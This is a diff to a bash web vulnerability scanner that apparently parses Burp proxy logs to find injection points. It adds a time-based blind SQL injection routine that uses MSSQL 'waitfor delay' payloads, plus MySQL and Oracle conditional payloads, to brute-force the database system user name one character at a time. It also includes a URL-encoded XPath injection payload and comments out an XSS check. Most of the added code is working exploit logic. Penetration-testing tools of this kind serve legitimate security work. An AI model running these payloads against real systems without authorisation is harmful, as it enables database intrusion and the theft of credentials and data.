@@ -1066,11 +1066,18 @@ if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 	fi
 fi
 #end of dbms enumeraton if statement
+
+#this line below calls the lettergrab data extraction routine that first tries status/length diffing and then tries delay diffing to perform data extraction:
 lettergrab
 
+
 if [[ "$dbms" == "" ]] ; then
-	echo "Could not determine DBMS. Testing for XPath injection."	
+	#if we get here then nothing worked - lets have a shot at XPath data extraction instead:
+	echo "Could not determine DBMS or extract data :-( Testing for XPath injection."	
 fi
+
+############# begining of XPath injection data extraction section ################
+
 xp=''
 #xpathcheck - numeric params			    #1 or count(parent::*[position()=1])>0
 badparams=`echo "$cleanoutput" | replace "$payload" "%31%20%6f%72%20%63%6f%75%6e%74%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%3e%30"`
@@ -2099,6 +2106,7 @@ cat ./listofxpathelements.txt 2>/dev/null
 	
 lettergrab()
 {
+echo "Trying status/length-based data extraction"
 # adding code to check if we've already got the sysuserlen (length of the system user name) and nambuf (the system user name) values.
 # if we do, lets try em out again on this parameter
 # if this fails, continue to re-run the full lettergrab() as normal...
@@ -2301,6 +2309,217 @@ if [[ $gotlength == 1 ]] ; then
 		((oflag=$oflag+1))	
 	done
 	echo ""
+	extract=0
+	if [[ $nambuf != "" ]] ; then 
+		remessage="SYS USER IS: $nambuf"
+		extract=1
+		echoreporter
+	fi
+fi
+
+#extra fi for end of checkflag if statement (this is just to avoid indenting all the above code by a tab):
+fi
+
+#uncomment the below when timebased extraction is done...
+
+#if [[ "extract" == 0 ]] ; then
+#	#status/length diffing didnt work - lets try time based diffing:
+#	lettergrabtimebased
+#fi
+#lettergrabtimebased
+
+}
+
+lettergrabtimebased()
+{
+echo "Trying time-based data extraction"
+#this is the same as lettergrab, but its *time*, not length/status based
+#currently have to hard-code the detection delay to 8 seconds as using a dynamic variable led to a weird bug...  
+# currently only works for MSSQL
+
+
+# adding code to check if we've already got the sysuserlen (length of the system user name) and nambuf (the system user name) values.
+# if we do, lets try em out again on this parameter
+# if this fails, continue to re-run the full lettergrabtimebased() as normal...
+# initalise a check flag:
+check_flag=0 
+if [[ "$nambuf" != "" ]] ; then
+	echo "Trying credentials already found: $nambuf"
+	#this determines the 'always wrong' reference request to suit the dbms:
+	if [[ $dbms == "mssql" ]] ; then                            
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if system_user = '$nambuf' waitfor delay '0:0:0'$end"`
+	elif [[ $dbms == "mysql" ]] ; then
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user() = 'foobar') then 789 else 0 end)$end"`
+	elif [[ $dbms == "oracle" ]] ; then
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when (select user from dual) = 'foobar' then 789 else 0 end$end"`
+	else
+		echo "Unable to determine DBMS"
+	fi
+
+	encodeinput=$badparams
+	encodeme
+	badparams=$encodeoutput
+	requester
+
+	if [ true = "$Z" ] ; then echo "DEBUG! false $request" ;fi
+
+	time_false=`echo $response | cut -d ":" -f 3 | cut -d "." -f1`
+	
+	#echo "response: $response"	
+	#echo "time of false response: $time_false"	
+
+	if [[ $dbms == "mssql" ]] ; then                                       
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if system_user = '$nambuf' waitfor delay '0:0:8'$end"`
+	elif [[ $dbms == "mysql" ]] ; then
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (system_user() = '$nambuf') then 789 else 0 end)$end"`
+	elif [[ $dbms == "oracle" ]] ; then
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when (select user from dual) = '$nambuf' then 789 else 0 end$end"`
+	else
+		echo "Unable to determine DBMS"
+	fi
+	if [ true = "$Z" ] ; then echo "DEBUG! true $request" ;fi	
+	encodeinput=$badparams
+	encodeme
+	badparams=$encodeoutput
+	requester
+
+	time_true=`echo $response | cut -d ":" -f 3| cut -d "." -f1`
+	#echo "time of true response: $time_true"	
+
+	#echo "debug sending iflag $request"
+	((timediff=$time_true-$time_false))
+	#time response comparison (note that we ignore results with < 3 secs difference)
+	if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then
+	remessage="SYS USER IS: $nambuf"
+	echoreporter
+	check_flag=1
+	fi
+fi
+
+if [[ "$check_flag" == "0" ]] ; then
+
+###get the length of the string
+horiz=40
+oflag=1
+while [[ $oflag -lt $horiz ]] ; do 
+	#only need to send the reference request (below) once
+	#this determines the 'always wrong' reference request to suit the dbms:
+	if [[ $oflag == "1" ]] ; then 
+		if [[ $dbms == "mssql" ]] ; then                            
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (len(system_user) = $oflag) waitfor delay '0:0:0'$end"`
+		elif [[ $dbms == "mysql" ]] ; then
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length(system_user()) = 999) then 789 else 0 end)$end"`
+		elif [[ $dbms == "oracle" ]] ; then
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when length((select user from dual)) = 999 then 789 else 0 end$end"`
+		else
+			echo "Unable to determine DBMS"
+			oflag=40
+		fi
+		encodeinput=$badparams
+		encodeme
+		badparams=$encodeoutput
+		requester
+		if [ true = "$Z" ] ; then echo "DEBUG! false $request" ;fi
+	
+		time_false=`echo $response | cut -d ":" -f 3 | cut -d "." -f1`
+
+	fi
+
+	if [[ $dbms == "mssql" ]] ; then                                       
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (len(system_user) = $oflag) waitfor delay '0:0:8'$end"`
+	elif [[ $dbms == "mysql" ]] ; then
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (length(system_user()) = $oflag) then 789 else 0 end)$end"`
+	elif [[ $dbms == "oracle" ]] ; then
+		badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when length((select user from dual)) = $oflag then 789 else 0 end$end"`
+	else
+		echo "Unable to determine DBMS"
+		oflag=40
+	fi
+
+	if [ true = "$Z" ] ; then echo "DEBUG! true $request" ;fi
+		
+	encodeinput=$badparams
+	encodeme
+	badparams=$encodeoutput
+	requester
+	#echo "debug sending iflag $request"
+	time_true=`echo $response | cut -d ":" -f 3| cut -d "." -f1`
+
+	#echo "debug sending iflag $request"
+	((timediff=$time_true-$time_false))
+	gotlength=0
+	#echo "timediff=$timediff"	
+	#time response comparison (note that we ignore results with < 3 secs difference)
+	if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then
+		remessage="SYS USER STRING LENGTH = $oflag"
+		echoreporter
+		sysuserlen=$oflag
+		oflag=40
+		gotlength=1	
+	fi
+	((oflag=$oflag+1)) 
+done
+###
+if [[ $gotlength == 1 ]] ; then
+	horiz=$sysuserlen #the length of the system user field in chars
+	oflag=1 #outerloop counter - this tracks the letters guessed correctly
+	#iflag=32 #innerloop counter - this tracks each letter guessed. init-ed to 32 at this is where valid chars start in the ascii index
+	nambuf="" #an expading string buffer to store the reslts
+	echo "Attempting to brute force the system_user account name. If you get bored hit CNTRL+c to skip. Please wait..."
+	while [[ $oflag -le $horiz ]] ; do
+		for asciinumber in `cat ./payloads/letterlist.txt` ; do 
+		if [[ $iflag == "32" && $oflag == "1" ]] ; then #this routine gets run once at the begining. it stores the always false response for comparison.
+			if [[ $dbms == "mssql" ]] ; then                            
+				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (ascii(substring(system_user,$oflag,1))=$asciinumber) waitfor delay '0:0:0'$end"`
+			elif [[ $dbms == "mysql" ]] ; then
+				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = 999) then 678 else 0 end)$end"`
+			elif [[ $dbms == "oracle" ]] ; then
+				badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when ascii(substr((select user from dual),$oflag,1)) = 999 then 678 else 0 end$end"`
+			else
+				echo "Unable to determine DBMS"
+				oflag=40
+				break
+			fi
+			encodeinput=$badparams
+			encodeme
+			badparams=$encodeoutput
+			requester
+			if [ true = "$Z" ] ; then echo "DEBUG! sending false $request" ;fi
+			time_false=`echo $response | cut -d ":" -f 3 | cut -d "." -f1`
+		fi
+		if [[ $dbms == "mssql" ]] ; then                                       
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator; if (ascii(substring(system_user,$oflag,1))=$asciinumber) waitfor delay '0:0:8'$end"`
+		elif [[ $dbms == "mysql" ]] ; then
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator/(case when (ascii(substring(system_user(),$oflag,1)) = $asciinumber) then 789 else 0 end)$end"`
+		elif [[ $dbms == "oracle" ]] ; then
+			badparams=`echo "$cleanoutput" | replace "$payload" "$numerator=case when ascii(substr((select user from dual),$oflag,1)) = $asciinumber then 789 else 0 end$end"`
+		else
+			echo "Unable to determine DBMS"
+			oflag=40
+			break
+		fi
+		encodeinput=$badparams
+		encodeme
+		badparams=$encodeoutput
+		requester
+		if [ true = "$Z" ] ; then echo "DEBUG! sending true $request" ;fi
+		time_true=`echo $response | cut -d ":" -f 3| cut -d "." -f1`
+
+		#echo "debug sending iflag $request"
+		((timediff=$time_true-$time_false))
+		#echo "timediff=$timediff"
+		#time response comparison (note that we ignore results with < 3 secs difference)
+		if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then
+			decasciiconv
+			echo -n "$output"
+			nambuf="$nambuf$output"
+			if [ true = "$Z" ] ; then echo "DEBUG! MATCH on: $output $request" ;fi
+			break
+		fi
+		done #end of inner loop
+		((oflag=$oflag+1))	
+	done
+	echo ""
 	if [[ $nambuf != "" ]] ; then 
 		remessage="SYS USER IS: $nambuf"
 		echoreporter
@@ -2310,6 +2529,7 @@ fi
 #extra fi for end of checkflag if statement:
 fi
 }
+
 
 decasciiconv()
 {
@@ -2469,7 +2689,7 @@ z=false
 #################command switch parser section#########################
 #available: g,y (problematic),z
 
-while getopts l:c:t:nsqehx:d:bu:P:v:L:M:Q:I:T:C:rWS:ABjYfoD:FGHRZYVUOKJENakmpwyz: namer; do
+while getopts l:c:t:nsqehx:d:bu:P:v:L:M:Q:I:T:C:rWS:ABjYfoD:FGHRZVUOKJENakmpwyz: namer; do
     case $namer in 
     l)  #path to burp log to parse
         burplog=$OPTARG
@@ -2567,9 +2787,9 @@ while getopts l:c:t:nsqehx:d:bu:P:v:L:M:Q:I:T:C:rWS:ABjYfoD:FGHRZYVUOKJENakmpwyz
         S=true
 	parameterstoskip=$OPTARG
         ;;
-    Y) # parameters to skip
-        Y=true
-	;;
+#	Y) # parameters to skip
+#    	Y=true
+#	;;
     F) # Dont skip params that have already been scanned
         F=true
 	;;
@@ -2732,9 +2952,9 @@ if [[ "$lastchar" == "/" ]] ; then
 fi
 
 #if we are not creating an input file from a burp log (-P), and no payloads have been specified, ask for a payload:
-if [[ true != "$P" && true != "$T" && true != "$Y" && true != "$s" && true != "$n" && true != "$q" && true != "$e" && true != "$b" && true != "$C" && true != "$r" && true != "$j" ]]; then
+if [[ true != "$P" && true != "$T" && true != "$s" && true != "$n" && true != "$q" && true != "$e" && true != "$b" && true != "$C" && true != "$r" && true != "$j" ]]; then
 	echo "FATAL: I need a payload type" >&2
-	echo "Some examples are: -s, -n, -q, -r, -e, -b, -Y, -C" >&2
+	echo "Some examples are: -s, -n, -q, -r, -e, -b, -C" >&2
 	exit
 fi
 
@@ -3097,6 +3317,7 @@ if [[ true != "$I" && true != "$T" ]] ; then
 	rm 3scannerinputlist.txt 2>/dev/null
 	rm 4scannerinputlist.txt 2>/dev/null
 fi
+### done parsing the burplog - the output is in scannerinputlist.txt ###
 
 #OPTIONAL URL connection testing routine:
 if [ true = "$T" ] ; then
@@ -3139,8 +3360,9 @@ else
 	cp scannerinputlist.txt cleanscannerinputlist.txt;
 fi
 
+# the user wants to parse the burplog and create a .input file
 if [ true = "$P" ] ; then
-	cat scannerinputlist.txt | while read quack; do
+	cat cleanscannerinputlist.txt | while read quack; do
 		echo $quack >> $parseOutputFile
 	done
 	echo "Input file $parseOutputFile created"
@@ -3153,7 +3375,6 @@ if [ true = "$P" ] ; then
 	rm urltested.txt 2>/dev/null	
 	exit
 fi
-
 
 entries=`wc -l cleanscannerinputlist.txt | cut -d " " -f 1`
 
@@ -3246,11 +3467,11 @@ if [ true = "$r" ] ; then
 	done
 fi
 
-if [ true = "$Y" ] ; then 
-	cat ./payloads/xsspayloads.txt | while read quack; do
-		echo $quack >> payloads.txt
-	done
-fi
+#if [ true = "$Y" ] ; then 
+#	cat ./payloads/xsspayloads.txt | while read quack; do
+#		echo $quack >> payloads.txt
+#	done
+#fi
 
 # this code scans through a custom payload list and replaces 'X' with the $timedelay value:
 # this allows users to specifiy their own timedelay sqli payloads:
@@ -3320,7 +3541,7 @@ K=0
 ####### scanning loop #############
 
 #this line makes sure we have specified a payload type
-if [[ true = "$n" || true = "$s" || true = "$e" || true = "$b" || true = "$q" || true = "$r" || true = "$Y" || true = "$C" ]] ; then
+if [[ true = "$n" || true = "$s" || true = "$e" || true = "$b" || true = "$q" || true = "$r" || true = "$C" ]] ; then
 
 #message in red
 echo -e '\E[31;48m'"\033[1mScan commenced\033[0m"
@@ -3762,32 +3983,34 @@ cat cleanscannerinputlist.txt | while read i; do
 					if [[ "$reponseStatusCode" != "200" && "$reponseStatusCode" != "404" ]]
 						then echo "ALERT: Status code "$reponseStatusCode" response";
 					fi 
-					#xss testing subsection
-					if [ true = "$Y" ] ; then
-						cat ./dumpfile | grep -i -o "$payload" > search.txt;
-						search=`cat search.txt`;
-						if [[ $search != "" ]] ; then
-							if [[ $method != "POST" ]] ; then  #we're doing a get - simples
-								echo "[XSS: $paramtotest] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt;
-								echo "[XSS: $paramtotest] $method URL: $uhostname$page"?"$output";
-							else
-								if (($firstPOSTURIURL>0)) ; then
-									if [ $firstPOSTURIURL == 1 ] ; then
-										echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"?"$static"??"$output" >> ./output/$safelogname$safefilename.txt;
-										echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"?"$static"??"$output"
-									else
-										echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"??"$output" >> ./output/$safelogname$safefilename.txt;
-										echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"??"$output"
-									fi
-								else
+					# xss testing subsection
+					# this is mothballed for now
+					#if [ true = "$Y" ] ; then
+					#	cat ./dumpfile | grep -i -o "$payload" > search.txt;
+					#	search=`cat search.txt`;
+					#	if [[ $search != "" ]] ; then
+					#		if [[ $method != "POST" ]] ; then  #we're doing a get - simples
+					#			echo "[XSS: $paramtotest] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt;
+					#			echo "[XSS: $paramtotest] $method URL: $uhostname$page"?"$output";
+					#		else
+					#			if (($firstPOSTURIURL>0)) ; then
+					#				if [ $firstPOSTURIURL == 1 ] ; then
+					#					echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"?"$static"??"$output" >> ./output/$safelogname$safefilename.txt;
+					#					echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"?"$static"??"$output"
+					#				else
+					#					echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"??"$output" >> ./output/$safelogname$safefilename.txt;
+					#					echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"??"$output"
+					#				fi
+					#			else
 									#normal post
-									echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt;
-									echo -e '\E[31;48m'"\033[1m[XSS: $paramtotest REQ:$K]\033[0m $method URL: $uhostname$page"?"$output";
-									tput sgr0 # Reset attributes.
-								fi
-							fi							
-						fi
-					fi	
+					#				echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt;
+					#				echo -e '\E[31;48m'"\033[1m[XSS: $paramtotest REQ:$K]\033[0m $method URL: $uhostname$page"?"$output";
+					#				tput sgr0 # Reset attributes.
+					#			fi
+					#		fi							
+					#	fi
+					#fi
+					#end of xss section	
 					#this subsection scans responses for common error strings:			
 					cat ./payloads/errors-two-words.txt | while read z; do 
 						cat ./dumpfile | egrep -i -o $z > search.txt;
